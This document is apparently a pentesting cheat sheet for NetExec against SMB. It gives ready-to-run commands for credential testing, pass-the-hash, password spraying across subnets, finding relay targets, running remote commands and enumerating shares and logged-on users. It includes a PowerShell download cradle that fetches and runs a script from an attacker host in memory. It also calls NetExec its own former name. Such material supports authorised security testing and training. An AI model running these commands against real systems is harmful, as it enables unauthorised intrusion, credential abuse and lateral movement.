# 08.03 NetExec SMB Authentication Execution Pass-the-Hash

> nxc smb · credential testing · PTH · command exec · shares · relay prep

## Overview

NetExec (nxc, formerly NetExec) is the primary Swiss-army-knife for SMB-based pentesting. Test credentials or NTLM hashes across whole subnets, execute commands when local admin, enumerate shares, and identify relay targets. A green [+] means valid credentials; (Pwn3d!) means local admin access. Use --continue-on-success when spraying so discovery doesn't stop at the first hit.

## Steps

- **Verify creds** — `nxc smb <TARGET> -u <USER> -p <PASS>` — green `[+]` = valid; `(Pwn3d!)` = local admin.
- **Pass-the-Hash** — swap `-p <PASS>` for `-H <HASH>`; works for local accounts.
- **Subnet spray** — use CIDR notation; `--continue-on-success` keeps going past the first hit.
- **Execute commands** — `-x 'cmd'` via cmd.exe; `-X 'ps_code'` via PowerShell — both require Pwn3d!.
- **SMB relay prep** — `--gen-relay-list relay.txt` outputs hosts with signing disabled (safe to relay).
- **Enumerate shares / sessions** — `--shares`, `--sessions`, `--loggedon-users`.

## Commands

### Credential testing and PTH

```bash
# Basic auth test
nxc smb <TARGET> -u <USER> -p '<PASS>'
nxc smb <TARGET> -u <USER> -H <HASH>               # Pass-the-Hash
nxc smb <TARGET> -u <USER> -H <HASH> --local-auth  # local admin
nxc smb <TARGET> -u '' -p ''                           # null session

# Spray entire subnet (stop-on-first is default; override it)
nxc smb <CIDR> -u users.txt -p '<PASS>' --continue-on-success

# Find hosts with SMB signing disabled (relay targets)
nxc smb <CIDR> --gen-relay-list relay.txt
```

### Command execution (requires local admin)

```bash
# cmd.exe execution
nxc smb <TARGET> -u <USER> -p '<PASS>' -x 'whoami /all'

# PowerShell execution
nxc smb <TARGET> -u <USER> -p '<PASS>' -X 'Get-Process | Select Name,Id'

# PTH + execute
nxc smb <TARGET> -u <USER> -H <HASH> -x 'ipconfig /all'

# Download cradle via -X (PowerShell, in-memory)
nxc smb <TARGET> -u <USER> -H <HASH> -X \
  "IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>/run.ps1')"
```

### Enumerate shares, sessions, and logged-on users

```bash
nxc smb <TARGET> -u <USER> -p <PASS> --shares          # list shares
nxc smb <TARGET> -u <USER> -p <PASS> --sessions         # active sessions
nxc smb <TARGET> -u <USER> -p <PASS> --loggedon-users   # who is logged on
nxc smb <TARGET> -u <USER> -p <PASS> --disks            # disk drives
```
